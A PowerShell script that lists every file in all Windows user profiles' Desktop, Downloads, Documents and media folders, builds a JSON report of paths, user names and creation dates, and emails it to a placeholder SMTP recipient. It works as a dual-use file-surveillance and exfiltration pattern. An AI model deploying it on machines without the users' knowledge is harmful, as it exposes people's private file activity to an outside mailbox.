#Requires -Version 5.1

# Configuration
$SmtpHost = 'smtp.test.com' # substitute for actual one
$SmtpPort = 587 # substitute for actual one
$Sender = 'sender@test.com' # substitute for actual one
$Recipient = 'recipe@test.com' # substitute for actual one
$PasswordPlain = '' # substitute for actual one

$TargetDirs = @('Desktop', 'Downloads', 'Documents', 'Pictures', 'Videos', 'Music') # substitute for actual one

$SecurePassword = ConvertTo-SecureString -String $PasswordPlain -AsPlainText -Force
$Credential = New-Object System.Management.Automation.PSCredential($Sender, $SecurePassword)

$UsersPath = "C:\Users"

# Get user directories (name = folder name in C:\Users)
$UserDirs = Get-ChildItem -Path $UsersPath -Directory -Force | 
    Where-Object { $_.Name -notin @('Public', 'Default', 'All Users', 'Default User') }

$JsonLines = @()

foreach ($UserDir in $UserDirs) {
    $UserName = $UserDir.Name  # Folder name = username
    
    foreach ($Target in $TargetDirs) {
        $FullPath = Join-Path -Path $UserDir.FullName -ChildPath $Target
        
        if (Test-Path -Path $FullPath) {
            $Files = Get-ChildItem -Path $FullPath -File -Recurse -Force -ErrorAction SilentlyContinue
            
            foreach ($File in $Files) {
                $Record = @{
                    user = @{
                        name = $UserName
                        file_name = $File.FullName
                        file_creation_date = $File.CreationTime.ToString("yyyy-MM-ddTHH:mm:ss")
                    }
                } | ConvertTo-Json -Depth 3 -Compress
                
                $JsonLines += $Record
            }
        }
    }
}

# Join with newlines (no commas, no brackets)
$JsonReport = $JsonLines -join "`n"

$TempFile = [System.IO.Path]::GetTempFileName() + ".json"
[System.IO.File]::WriteAllText($TempFile, $JsonReport, [System.Text.Encoding]::UTF8)

try {
    Send-MailMessage -SmtpServer $SmtpHost -Port $SmtpPort -UseSsl:$true `
        -From $Sender -To $Recipient `
        -Subject "User Files Report - $(Get-Date -Format 'yyyy-MM-dd HH:mm')" `
        -Body "Attached: User files report from $env:COMPUTERNAME" `
        -Attachments $TempFile `
        -Credential $Credential `
        -Encoding UTF8
    
    Remove-Item -Path $TempFile -Force -ErrorAction SilentlyContinue
} catch {
    Write-Error "Failed to send email: $_"
    exit 1
}
